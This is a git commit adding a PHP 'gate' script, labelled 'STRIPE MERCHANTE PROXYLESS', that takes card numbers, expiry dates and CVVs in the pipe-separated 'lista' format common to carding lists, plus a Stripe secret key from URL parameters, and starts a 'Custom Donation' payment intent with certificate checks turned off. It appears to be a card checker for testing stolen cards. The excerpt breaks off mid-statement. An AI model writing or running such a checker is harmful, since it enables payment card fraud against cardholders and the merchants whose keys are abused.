f81b7b91cfaf6e50c3ddaf2aa60777c9266da68e
minmayngarloe <53460900+minmayngarloe@users.noreply.github.com>
2022-12-09 10:16:33 +0630

    Add files via upload

---
+++ gate/inr50.php
@@ -0,0 +1,64 @@
+<?php
+
+
+//===================== [ MADE BY ITSSWAGGER ] ====================//
+#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
+
+
+
+error_reporting(0);
+date_default_timezone_set('America/Buenos_Aires');
+
+
+//================ [ FUNCTIONS & LISTA ] ===============//
+
+function GetStr($string, $start, $end){
+    $string = ' ' . $string;
+    $ini = strpos($string, $start);
+    if ($ini == 0) return '';
+    $ini += strlen($start);
+    $len = strpos($string, $end, $ini) - $ini;
+    return trim(strip_tags(substr($string, $ini, $len)));
+}
+
+
+function multiexplode($seperator, $string){
+    $one = str_replace($seperator, $seperator[0], $string);
+    $two = explode($seperator[0], $one);
+    return $two;
+    };
+
+$idd = $_GET['idd'];
+$amt = $_GET['cst'];
+if(empty($amt)) {
+	$amt = '50';
+	$chr = $amt * 100;
+}
+$sk = $_GET['sec'];
+$lista = $_GET['lista'];
+    $cc = multiexplode(array(":", "|", ""), $lista)[0];
+    $mes = multiexplode(array(":", "|", ""), $lista)[1];
+    $ano = multiexplode(array(":", "|", ""), $lista)[2];
+    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+if (strlen($mes) == 1) $mes = "0$mes";
+if (strlen($ano) == 2) $ano = "20$ano";
+
+
+
+
+
+//================= [ CURL REQUESTS ] =================//
+
+#-------------------[1st REQ]--------------------#
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Custom Donation');
+$result2 = curl_exec($ch);
+echo "<br><b>Result2: </b> $result2<br>
